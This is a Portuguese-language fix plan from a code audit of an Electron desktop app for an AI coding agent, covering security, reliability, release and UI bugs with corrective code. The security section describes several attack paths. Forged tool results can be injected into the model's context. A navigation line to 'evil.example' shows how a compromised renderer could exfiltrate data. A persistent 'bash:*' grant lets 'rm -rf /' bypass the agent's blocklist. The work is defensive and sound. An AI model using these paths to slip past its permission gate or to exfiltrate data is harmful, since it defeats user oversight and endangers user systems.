# FIX.md — Plano de correções

> Origem: análise profunda do projeto (2026-10), com verificação manual de cada achado
> marcado ✅. Reúne as correções concretas, em ordem de prioridade. Cada item traz
> **local exato**, **por quê** e **a correção**.
>
> Legenda: 🔴 alta · 🟠 média · 🟡 baixa. ✅ = achado verificado por leitura do código.

---

## Parte 1 — Segurança 🔴

### FIX-1 ✅ Forja de `EngineRequest` via spread de `config`

- **Local:** `src/main/index.ts:622-634` (espelhado em `scripts/smoke-harness.cjs:321-328`)
- **Problema:** `post({ type: "subAgentConfigResponse", id, action, ...config })` — o
  spread vem **depois** de `type`, então o renderer (não confiável) pode mandar
  `config = { type: "browserResult", id: "…", ok: true, result: {…} }` e forjar
  **qualquer** mensagem do engine. `browserResult` é a pior: spoof de resultado de
  ferramenta de browser entra direto no contexto do modelo. Confirmed: o engine-host
  despacha por `type` (`src/engine-host/index.ts:1947`).
- **Correção:** montar o objeto só com campos explícitos:

```ts
post({
  type: "subAgentConfigResponse",
  id,
  action,
  model: config?.model,
  reasoningEffort: config?.reasoningEffort,
  instructions: config?.instructions,
});
```

Aplicar o mesmo no smoke-harness (B8 do relatório de segurança).

### FIX-2 ✅ `shell.openExternal(url)` sem allowlist de esquema

- **Local:** `src/main/index.ts:516-519`
- **Problema:** qualquer `window.open` do renderer (comprometido via XSS/injeção de
  UI) abre URLs arbitrários pelo shell do SO; no Windows, `file://`/executáveis e
  esquemas customizados rodam programas. É o primeiro elo da cadeia XSS→RCE do
  checklist do Electron.
- **Correção:**

```ts
mainWindow.webContents.setWindowOpenHandler(({ url }) => {
  try {
    if (["http:", "https:"].includes(new URL(url).protocol)) {
      void shell.openExternal(url);
    }
  } catch {
    // malformed URL — do nothing
  }
  return { action: "deny" };
});
```

### FIX-3 ✅ Sem guarda `will-navigate` na janela principal

- **Local:** `src/main/index.ts:492-536` (só existe `setWindowOpenHandler`)
- **Problema:** o preload roda em **toda** navegação do webContents. Um renderer
  comprometido pode `window.location = "https://evil.example"` e a página remota
  recebe `window.ruby` com a superfície IPC inteira. O CSP `connect-src 'none'`
  **não** bloqueia exfiltração por navegação top-level.
- **Correção:**

```ts
const devServerUrl = process.env.ELECTRON_RENDERER_URL;
mainWindow.webContents.on("will-navigate", (event, url) => {
  if (devServerUrl && url.startsWith(devServerUrl)) return; // dev HMR
  event.preventDefault();
});
mainWindow.webContents.on("will-redirect", (event) => event.preventDefault());
```

Também aplicar ao `WebContentsView` do browser (`src/main/browser.ts:143-152`): as
navegações autônomas da página (links/JS) hoje não passam pelo filtro http/https,
que só existe no caminho de ferramenta. Adicionar `will-navigate` na view rejeitando
esquemas fora de `http:`/`https:`, e um `setWindowOpenHandler` que nega (ou roteia
para `newTab` gerenciada — M9).

### FIX-4 ✅ Grant `bash:*` passa pela blocklist catastrófica

- **Local:** `src/engine-host/index.ts:767-782` + engine `src/core/permissions.ts:141-157`
- **Problema:** `createConfirmFn` chama só `decideConfirmation`, que **não consulta**
  `matchesNeverAutoApprove`. Com um grant `bash:*` existente (oferecido pela UI como
  "always allow this tool" e persistível), um `rm -rf /` posterior é auto-aprovado
  sem prompt — anulando o gate. A proteção existe só no caminho `--yes`
  (`decideAutoApprove`, permissions.ts:221-229). **A persistência está correta; a
  avaliação tem o buraco.**
- **Correção:** no início do `confirmFn`:

```ts
import { matchesNeverAutoApprove } from "@rubyclii/cli";

const decision = matchesNeverAutoApprove(toolName, args)
  ? "ask" // never allow; the modal decides, and the grant is never persisted
  : decideConfirmation(allowSet, denyPatterns, toolName, args, true);
```

O ideal é corrigir no próprio engine (`decideConfirmation` consultar a blocklist no
caminho allow), protegendo qualquer host de uma vez.

### FIX-5 ✅ `grantKey` do wire é descartado

- **Local:** `src/engine-host/index.ts:1906` (chamada) vs `:816-821` (assinatura com
  `grantKey: GrantKeyKind = "exact"`)
- **Problema:** `handleApprovalResponse(id, decision, scope)` nunca passa o 4º
  argumento. "Sempre permitir esta ferramenta" e "servidor MCP inteiro" gravam
  **silenciosamente** só a chave exata — comportamento diferente do que a UI mostra.
- **Correção:** `await handleApprovalResponse(request.id, request.decision, request.scope, request.grantKey)`.

---

## Parte 2 — Confiabilidade do agente 🟠

### FIX-6 ✅ `persistGrant` antes de `pending.settle` — hang de 10 min

- **Local:** `src/engine-host/index.ts:846-853`
- **Problema:** `await persistGrant(...)` roda **antes** de `pending.settle(decision)`;
  erro de disco cai no `catch(fail)` sem nunca settar → a ferramenta pendura até o
  timeout de 10 min.
- **Correção:** settar a decisão independentemente da persistência:

```ts
try {
  if (effectiveScope !== "once" && key) await persistGrant(key, effectiveScope);
} finally {
  pending.settle(decision);
}
post({ type: "approvalResolved", id, decision, scope: effectiveScope });
```

### FIX-7 ✅ Review de worker sem timeout — turno pendura para sempre

- **Local:** `src/engine-host/index.ts:964-973` (`waitForSubAgentReview`)
- **Problema:** resolve só via resposta do renderer ou `denyAllPending`, mas o
  `denyAllPending` de fim de turno é inalcançável enquanto o turno está bloqueado no
  próprio review. UI morta/fechada = turno pendurado para sempre. (As outras três
  esperas — linhas 467, 611, 738 — têm timeout de 10 min; esta não.)
- **Correção:** timeout de 10 min → auto-`cancel` (como as demais), e/ou responder
  `cancel` quando o renderer sinalizar fechamento/reset.

### FIX-8 ✅ `shutdown` mata o engine no mesmo tick — filhos MCP órfãos

- **Local:** `src/main/index.ts:407-423` (e `before-quit` em `:759-761`)
- **Problema:** o comentário diz "dar um momento ao motor para fechar os MCPs" mas
  `current.kill()` roda no mesmo tick — anulando a intenção. No Windows nada reap
  órfãos.
- **Correção:**

```ts
const exited = new Promise<void>((resolve) => current.once("exit", () => resolve()));
current.postMessage({ type: "shutdown" } satisfies EngineRequest);
await Promise.race([exited, new Promise((r) => setTimeout(r, 2_000))]);
current.kill();
```

(`stopEngine` passa a ser `async` ou dispara o kill via callback.)

### FIX-9 ✅ Timeout de screenshot wedge a fila CDP permanentemente

- **Local:** `src/main/browser.ts:553-567` + fila em `:276-289`
- **Problema:** o `withTimeout` rejeita para o chamador, mas o `Page.captureScreenshot`
  pendurado mantém `this.queue` eternamente pendente → todo comando CDP seguinte nunca
  resolve; o browser fica morto até reiniciar o app.
- **Correção:** aplicar o timeout **dentro** da cadeia da fila (o próximo comando
  entra mesmo se o anterior não resolveu) ou fazer `debugger.detach()` + reset do
  estado no timeout.

### FIX-10 ✅ Corrida de `startEngine` — motor duplo/órfão

- **Local:** `src/main/index.ts:336-364`; gatilhos concorrentes em `:489` e `:578-579`
- **Problema:** a guarda `if (engine) return` é avaliada **antes** do
  `await readSavedApiKey()`; dois gatilhos simultâneos fazem fork duplo e sobrescrevem
  a referência global — um processo órfão falando para o motor errado.
- **Correção:** memoizar a promise: `startPromise ??= doStart(); return startPromise;`
  (limpar a promise no finally).

### FIX-11 ✅ `setBrowserBounds` sem validação/clamp — overlay sobre o modal

- **Local:** `src/main/index.ts:727-733`
- **Problema:** números arbitrários (negativos, NaN, enormes) posicionam o
  `WebContentsView` nativo (sempre acima do renderer) por cima de qualquer área —
  inclusive sobre o modal de aprovação (spoof visual).
- **Correção:** exigir finitos (`Number.isFinite`) e clampar ao
  `mainWindow.getContentBounds()`.

### FIX-12 TOCTOU no `git apply` do worktree

- **Local:** `src/engine-host/worktrees.ts:73-85`
- **Problema:** `apply()` **recomputa** o diff (`await this.diff(id)`) em vez de
  aplicar os bytes que o usuário revisou. Um processo em background deixado pelo
  worker pode alterar o worktree entre review e merge → aplica-se algo diferente do
  aprovado.
- **Correção:** cachear `result.diff` no momento do review e aplicar exatamente
  esses bytes.

### FIX-13 Vazamentos de worktree/branch

- **Local:** `src/engine-host/worktrees.ts:57-60, 87-94, 51-52`
- **Problema:** `cleanup` engole falha de `git worktree remove` (comum no Windows por
  locks) deixando checkout em `%TEMP%` + metadados órfãos; o `catch` do `create` não
  apaga o branch criado; `safeId` truncado em 24 chars pode colidir.
- **Correção:** logar falha + retry com `git worktree prune`; `branch -D` no catch do
  create; sufixo randômico no nome do branch.

### FIX-14 `browserRequest` sem validação / `switch` sem `default`

- **Local:** `src/main/index.ts:371-374`; `src/main/browser-service.ts:76-146`
- **Problema:** método desconhecido retorna **sem `reply`** → chamada pendurada até o
  timer de 45 s do engine. E `onState()` dentro do catch pode lançar antes do `reply`
  (`browser-service.ts:147-151` → `listTabs` chama `getURL()` em webContents destruído).
- **Correção:** validar `method` contra o union na entrada; `default: return reply(false, undefined, "unknown method")`; chamar `reply` antes de `onState`; try/catch por aba em `listTabs`.

### FIX-15 Corrida ref→dispatch no browser

- **Local:** `src/main/browser.ts:457-527` (validação no início, dispatch depois de
  vários `await`; `navigate`/`goBack` rodam fora da fila)
- **Problema:** navegação do usuário entre `requireRef` e o `Input.dispatch*` faz o
  clique/digitação caírem em outra página nas mesmas coordenadas — a garantia de refs
  é invalidada.
- **Correção:** serializar `loadURL`/navegações na mesma fila CDP e verificar um
  "epoch de página" (contador incrementado em cada navegação) antes do dispatch.

### FIX-16 Outros médios do engine-host (relatório F7–F22)

- Workers de **workflow** não entram em `subAgentRuns` → shutdown não os espera
  (`index.ts:1957-1968`) — registrá-los.
- `mcp refresh/add/remove` e `hello` rodam `buildAgent()` sem guarda de `running`
  (`index.ts:263-289`) — recusar durante turno como `setModel` faz.
- `reset` durante turno nega aprovações mas não troca a sessão (`index.ts:1970-1974`
  + `:1481-1488`) — abortar o turno ativo antes de `startNewSession`.
- `postSubAgent` reenvia objeto completo a cada evento, com diff **sem limite** no
  caminho ao vivo (`index.ts:1165`) — deltas + truncar (usar o mesmo teto de 120k do
  snapshot) + throttle.
- `compact_started`/`compact_threshold_warned` são descartados (`index.ts:326-375`)
  → auto-compaction invisível na UI — encaminhar para o flag `compacting`.
- `reportUsage` fixa `outputTokens: 0` (`index.ts:1463-1464`) — acumular como nos
  subagentes (`:1012-1018`).
- `browser_screenshot`/`browser_scroll` marcados `readonly`
  (`browser-tools.ts:183, 222`) embora gravem arquivo/mudem estado — remover o
  `readonly` (plan mode os liberaria indevidamente).
- Explorer "read-only" herda `web_fetch` (`index.ts:1071-1075`) — rede livre para
  exfiltração; remover do subset ou exigir aprovação.
- `persistGrant` global reescreve `permissions.allow` a partir do set em memória
  (`index.ts:798-801`) — grants removidos do config.json ressuscitam; recarregar
  `loadConfig()` antes de gravar.

---

## Parte 3 — Release / auto-update 🔴🟠

### FIX-17 ✅ Auto-update quebrado em todos os canais — nome do artefato

- **Local:** `electron-builder.config.cjs:36` (`artifactName: "${productName}-…"`,
  `productName: "Ruby Desktop"` com **espaço**) + `release.yml:114-117`
- **Problema (cadeia completa verificada):** o GitHub só aceita
  `[0-9A-Za-z._-]` em nomes de assets, então o `latest*.yml` grava o nome com
  espaço→hífen (`Ruby-Desktop-0.1.2-win.exe` — confirmado em `release/latest.yml`),
  mas o `gh release upload` publica o nome **literal com espaço** (confirmado no
  disco: `Ruby Desktop-0.1.2-win.exe`). O electron-updater baixa substituindo espaço
  por hífen → requisição para `Ruby-Desktop-…` → **404** → `autoUpdater` emite error e
  cai no fallback de "abra a página de releases". **O auto-update nunca aplica nada.**
- **Correção:** `"artifactName": "${name}-${version}-${os}-${arch}.${ext}"`
  (`name` = `ruby-desktop`, já seguro para o GitHub); e fazer
  `scripts/collect-release-assets.cjs` validar que cada `files[].url`/`path` dos
  `latest*.yml` existe entre os assets staged (falha cedo se não existir).

### FIX-18 ✅ `release/` acumula versões; coletor não filtra

- **Local:** `scripts/collect-release-assets.cjs:11-13, 36-39`
- **Problema (evidência no disco hoje):** instaladores **0.1.0, 0.1.1 e 0.1.2**
  misturados com `package.json` em **0.1.3**; `release/release-assets/` ainda tem
  assets de 0.1.0 (o staging nunca é limpo); `latest.yml` aponta para 0.1.2. Uma
  execução local publicaria três versões de instaladores com feed de outra —
  auto-update corrompido e blockmap errado. Em CI os runners limpos escondem isso.
- **Correção:** `fs.rmSync(releaseDirectory, { recursive: true, force: true })` antes
  do `dist` (ou filtrar por `Ruby Desktop-<pkg.version>-*`); `rmSync` do staging
  antes de copiar; exigir `.blockmap` para cada instalador de update.

### FIX-19 Assimetria do feed de update

- **Local:** `scripts/collect-release-assets.cjs:19-34`
- **Problema:** linux exige `latest-linux.yml`, mas Windows/mac **não** exigem
  `latest.yml`/`latest-mac.yml` — um release sem assinatura sai "válido" porém
  permanentemente sem auto-update, sem sinal algum.
- **Correção:** exigir o feed correspondente por plataforma (ou falhar cedo quando o
  feed não puder ser gerado).

### FIX-20 Pipeline de release sem verificação

- **Local:** `release.yml:74-82`; `verify-package.cjs:6-7`
- **Problema:** o release **nunca** roda `verify-package` (só o CI roda, e só para
  layout Windows) — o artefato publicado nunca é verificado. O verificador também não
  checa `out/preload/index.js`, `out/renderer/index.html`, `resources/engine/skills/builtin`
  nem `app-update.yml`.
- **Correção:** rodar `verify-package` por plataforma nos jobs de build do release;
  estender a lista de arquivos obrigatórios.

### FIX-21 `copy-skills` silencioso com 0 skills

- **Local:** `scripts/copy-skills.mjs:36-37`
- **Problema:** só imprime a contagem — `dist/` do engine obsoleto (a armadilha
  clássica do `file:../RubyCLI`) resulta em `skills=0` silencioso e nada verifica
  `resources/engine/skills/builtin` no pacote.
- **Correção:** `if (copied.length === 0) process.exit(1)` + checar
  `resources/engine/skills/builtin` no `verify-package.cjs`.

### FIX-22 Engine pin flutuante na CI

- **Local:** `ci.yml:22-23`; `release.yml:46-47`
- **Problema:** `vars.RUBYCLI_REF || 'main'` — um release reconstruído via
  `workflow_dispatch` pega um engine diferente do original; zero reproducibilidade.
  O lock regista `../RubyCLI` em `0.4.0` mas ninguém confere.
- **Correção:** pinar tag/SHA em `vars`; assert
  `node -p "require('../RubyCLI/package.json').version"` contra o lock.

### FIX-23 `workflow_dispatch` pode sobrescrever release publicada

- **Local:** `release.yml:108-114` (`--clobber`)
- **Problema:** substituir assets de release já publicada quebra o sha512/blockmap de
  clientes já instalados.
- **Correção:** exigir `isDraft == true` mesmo em dispatch (ou publicar nova versão).

### FIX-24 Notarização/assinatura

- **Local:** `electron-builder.config.cjs:56-64`
- **Problema:** sem `APPLE_*` a notarização é **pulada com `log.warn`** enquanto o app
  sai assinado — Gatekeeper rejeita e nada falha. Sem `spctl`/`stapler validate`/
  verificação de assinatura Windows no pipeline. Sem `entitlements.mac.plist` explícito.
- **Correção:** `mac.notarize: true`; steps pós-build de verificação; adotar
  `forceCodeSigning: true` (transforma falta de certificado em falha de build, não em
  release mudo).

---

## Parte 4 — Renderer 🟠

### FIX-25 ✅ Memória: `items`/`result` crescem sem limite

- **Local:** `src/renderer/src/store.ts:148, 1092-1117`
- **Problema:** cada tool guarda `result` completo (um `read` de arquivo grande vira
  string inteira presa no store **e** no DOM; o `max-h-80` do ToolCallCard limita
  altura, não conteúdo). Só o caminho legado trunca (`slice(-12_000)`).
- **Correção:** truncar `result` no ingest (ex. 32k chars + marcador "… truncado",
  completo só no copy); considerar virtualização da lista.

### FIX-26 ✅ Re-render O(n) por token

- **Local:** `src/renderer/src/components/ChatView.tsx:48-50, 75`;
  `ChatStats.tsx:10, 33-37`; `ChatView.tsx:20-27`
- **Problema:** só o Markdown é memoizado; `Item` não é `memo`, então cada token
  re-renderiza toda a lista; `ChatStats` refiltra `items` por token; autoscroll faz
  `scrollIntoView` por token (layout forçado).
- **Correção:** `const Item = memo(…)`; derivar turnos/etapas no store (contadores
  incrementais); throttlear autoscroll com `requestAnimationFrame`.

### FIX-27 ✅ Parser de slash commands devora texto

- **Local:** `src/renderer/src/store.ts:1148-1157`
- **Problema:** **qualquer** entrada começando com `/` é interceptada e nunca chega ao
  modelo (`/src/index.ts`, `/etc/hosts` viram "Comando desconhecido").
- **Correção:** interceptar só comandos conhecidos (do catálogo de
  `slash-commands.ts`) e tratar o resto como texto normal.

### FIX-28 ✅ `/help` anuncia comando inexistente

- **Local:** `src/renderer/src/store.ts:676`
- **Problema:** "Use /new-skill para criar uma Skill personalizada." — `/new-skill`
  não existe em lugar nenhum (única ocorrência no repo). Duas fontes de verdade:
  catálogo de sugestões × executor.
- **Correção:** implementar `/new-skill` (ativa a skill builtin do engine, como o
  CONTEXT.md M3.7 descreve) ou remover a linha; unificar catálogo e executor numa
  fonte só.

### FIX-29 Sem ErrorBoundary

- **Local:** `src/renderer/src/App.tsx:15`
- **Problema:** um throw no parse do Markdown de mensagem malformada derruba a UI
  inteira para tela branca — perdendo o transcript, que é o que se quer preservar.
- **Correção:** ErrorBoundary com fallback renderizando o texto cru da mensagem que
  falhou.

### FIX-30 Acessibilidade dos modais

- **Local:** `src/renderer/src/components/ApprovalModal.tsx:13-14 vs 47-53`;
  `SettingsModal.tsx:33-41`
- **Problema:** (a) comentário promete "backdrop resolve to deny" mas o backdrop não
  tem `onClick` (só Escape funciona — verificado); (b) sem focus trap — Tab sai do
  modal com o engine bloqueado; (c) SettingsModal não fecha no Escape (inconsistente
  com ModelPicker/ChatStats); (d) fundo não fica `inert`; (e) Escape=negar sem dica
  visível ("Esc nega") — usuário nega sem querer.
- **Correção:** alinhar comentário/comportamento (adicionar `onClick` no backdrop ou
  corrigir o comentário), focus trap + `inert`, Escape no SettingsModal, rodapé "Esc
  nega".

### FIX-31 Contradição: esconder o painel do browser mata a página do agente

- **Local:** `src/renderer/src/App.tsx:22-25 vs 50-53`;
  `Sidebar.tsx:246-252`
- **Problema:** o comentário diz "hiding the panel does not close the page the agent
  is working with", mas todos os caminhos de esconder chamam `closeBrowser()` —
  esconder mata a página em uso pelo agente.
- **Correção:** separar "ocultar painel" (`showBrowser=false`) de "fechar navegador"
  (`closeBrowser()`), com confirmação quando houver turno ativo.

### FIX-32 i18n inconsistente (UI majoritariamente PT-BR)

- **Locais verificados:** `store.ts:644` ("This tool call did not finish…"),
  `UserQuestionCard.tsx:315` ("Type your answer"), `SubAgentConfigCard.tsx:106, 186`
  ("Reasoning effort"), `SubAgentCard.tsx:58-59, 68` (role/effort crus),
  `ModelPicker.tsx:152` ("Reasoning"), `ChatView.tsx:129-132` (status cru no
  EmptyState enquanto o StatusBar traduz os mesmos valores).
- **Correção:** traduzir/mapping dos valores; padronizar o EmptyState com o StatusBar.

### FIX-33 Outros médios/baixos do renderer

- Pareamento call↔result por nome/FIFO (`store.ts:518-523, 1097-1114`) — chamadas
  homônimas concorrentes podem trocar de resultado; correlacionar por id quando o
  engine expuser.
- `contextUsed` não é zerado ao trocar/restaurar sessão (`store.ts:878-889`).
- Fallback silencioso de modelo no engine deixa `store.model` divergente
  (`store.ts:1193-1196` + `engine-host/index.ts:1446-1454`) — re-sincronizar.
- Enter durante turno falha em silêncio (`Composer.tsx:36-40`) — dar feedback ou
  enfileirar.
- `formatArgs` corta valores em 120 chars inclusive no painel expandido
  (`ToolCallCard.tsx:35, 86-99`) — mostrar versão completa com teto maior.
- Imagem markdown renderiza `<img>` quebrado (CSP bloqueia remoto)
  (`Markdown.tsx:59-166`) — placeholder "imagem não suportada".
- `highlightCode` é O(n²) (`Markdown.tsx:240-252`) — pré-computar lookahead.
- `aria-checked` + `aria-pressed` conflitantes em `UserQuestionCard.tsx:237-239`;
  falta `role="radiogroup"`.
- `key={index}` em `OutputPanel.tsx:61`; skill com nome maiúsculo nunca ativa
  (`store.ts:791`); `/goal pause texto extra` engole o resto (`store.ts:740-756`);
  data da sessão sem hora (`Sidebar.tsx:319-331`); popovers sem click-outside
  (`Sidebar.tsx:98-159`); `Falha: undefined` no McpPanel (`McpPanel.tsx:286`).

---

## Parte 5 — Build / testes / CI 🟠

### FIX-34 ✅ Drift real do smoke-harness

- **Local:** `scripts/smoke-harness.cjs:281-378`
- **Problema:** os nomes de canal são **strings literais** (não importam o mapa `IPC`)
  e faltam `ruby:open-browser`, `ruby:close-browser`, `ruby:set-browser-bounds`
  (o renderer os usa de verdade — `App.tsx:52`, `BrowserPanel.tsx:36`). Como são
  `send`, a ausência é no-op silencioso: **smoke verde com app quebrado** — o cenário
  que o próprio comentário do arquivo promete evitar. Também: `get-engine-info`
  devolve `undefined` vs `lastReady` no app; `get-recent-workspaces` devolve `[]` vs
  histórico real; `CHANNEL` hardcoded (`smoke-harness.cjs:18`).
- **Correção:** importar/derivar do mapa `IPC` (exportar um JSON/JS compartilhado que
  os `.cjs` consumam), registrar os 3 canais, alinhar a semântica dos stubs.

### FIX-35 Nenhum teste automatizado roda em CI

- **Local:** `.github/workflows/ci.yml`; `package.json:9-19` (sem script `test`)
- **Problema:** os únicos testes do pipeline são os do engine (vitest). Os 6 smoke
  tests são manuais e não rodam em CI; não há framework unitário no Desktop.
- **Correção:** job de smoke no CI com `RUBY_API_KEY` secret — começar por
  `smoke-markdown` e `smoke-session-history` (os únicos sem turno de provider);
  vitest para os reducers do `store.ts`, política de permissões e round-trip do
  contrato IPC.

### FIX-36 Invariantes de segurança sem teste

- **Problema:** quatro invariantes cruciais não têm assert nenhum: (1) `allow` de
  `.rubycli/settings.json` de repo é ignorado (GHSA-3g98-ffw6-87mg); (2) blocklist
  catastrófica nunca persiste como grant; (3) markdown sem HTML bruto; (4) browser
  só http(s) (rejeição de `file://`).
- **Correção:** adicionar asserts nesses quatro nos smokes existentes
  (permissions/markdown/browser). Regra do AGENTS.md: assert em **efeito**, não em
  "sucesso relatado".

### FIX-37 Cobertura ausente (zero testes hoje)

- **Worktrees** (`src/engine-host/worktrees.ts`) — snapshot/diff/apply/discard.
- **Workflow DSL** no Desktop (`workflowEvent`, `store.ts:925`).
- **Auto-update** inteiro (inclusive o fallback GitHub).
- **Instaladores** — nada instala/lança o app empacotado.
- **Runtime macOS/Linux** — nenhum smoke roda fora de Windows.
- **RPC engine→main do browser** — `smoke-browser` chama o serviço diretamente;
  `browserRequest`/`browserResult` nunca são exercitados (`smoke-browser.cjs:30-31,
  370-387` tem `onBrowserRequest` e ninguém usa).
- **Spawn de MCP stdio no app empacotado** (armadilha `ELECTRON_RUN_AS_NODE` +
  `process.execPath` = `.exe` do app, documentada no AGENTS.md, nunca testada em
  pacote).

### FIX-38 tsconfig e hardening do build

- `tsconfig.web.json` sem `"types"` — globais Node vazam no typecheck do renderer
  (hoje não usadas, mas sem guardrail). Fix: `"types": ["vite/client"]`.
- `tsconfig.node.json` com `module: ESNext` para saída CJS — `import.meta`/TLA passam
  no typecheck e quebram no bundle. Fix: `module: CommonJS` (ou
  `verbatimModuleSyntax`).
- `verify-engine-bundle.cjs:56` isenta `electron` — enfraquece o invariante "engine
  sem Chromium". Fix: remover a isenção; cobrir `import()` não-literal e validar
  `out/engine/skills/**`.
- `sourceMappingURL` do engine aponta para `.map` não empacotado
  (`electron-builder.config.cjs:32`). Fix: `sourcemap: "inline"` ou remover o
  comentário no build de release.
- Lixo de smoke no repo: `.build-cache-*` (criados por `smoke-permissions.cjs:38-40`),
  `out/*.png`, `browser-out.txt` na raiz — sem cleanup e fora do `.gitignore`.
  Fix: cleanup no fim do teste + padrões no gitignore. (Também remover o
  `console.log("[browser] module loading")` de debug em `smoke-browser.cjs:28-32`.)
- `electronUpdaterCompatibility: ">= 2.16"` é no-op com electron-updater 6.x
  (`electron-builder.config.cjs:37`). Fix: remover/documentar.
- Ícone mac/linux é PNG não-quadrado (1031×867) — a conversão para `.icns` nunca é
  exercitada em CI. Fix: `ruby-mark-512.png` quadrado ou `.icns`.
- `linux.maintainer` sem e-mail (lintian). Fix: `"RubyCLI <dev@rubycli.cloud>"`.
- Ações `@v4` sem SHA pin; sem `timeout-minutes`/`concurrency` nos workflows.
- `lastReady`/`getEngineInfo` nunca é chamado pelo renderer (código morto) —
  consumir no mount ou remover.

---

## Ordem sugerida de execução

| Fase | Itens | Por quê |
|---|---|---|
| **1. Segurança (hoje)** | FIX-1 … FIX-5 | Uma mudança pequena por item elimina forja de protocolo, XSS→RCE e bypass da blocklist |
| **2. Release (antes da próxima release)** | FIX-17 … FIX-19 | O auto-update está quebrado agora; a correção é de uma linha |
| **3. Confiabilidade (esta semana)** | FIX-6 … FIX-11 | Dois hangs + órfãos + browser wedge — afetam uso real |
| **4. Testes (próximas duas semanas)** | FIX-34 … FIX-37 | Sem isso, os fixes acima podem regredir sem ninguém ver |
| **5. Renderer + resto** | FIX-25 … FIX-33, FIX-12 … FIX-16, FIX-20 … FIX-24, FIX-38 | Escalabilidade, polimento e hardening |

---

## Notas

- Cada achado 🔴/🟠 marcado com ✅ foi verificado por leitura direta do código-fonte
  durante a análise (não é inferência de relatório de terceiros).
- Os FIX-4 e FIX-17 envolvem o engine/repo de release: FIX-4 pode ser corrigido no
  Desktop (`createConfirmFn`) ou, melhor, no RubyCLI (`decideConfirmation`); FIX-17
  exige mudar `artifactName` e validar o coletor de assets.
- Ao corrigir, seguir a regra do AGENTS.md: smoke tests asseguram **efeitos**, não
  "sucesso relatado" — os dois bugs mais caros do projeto passariam por um teste que
  confia no "ok" da ferramenta.
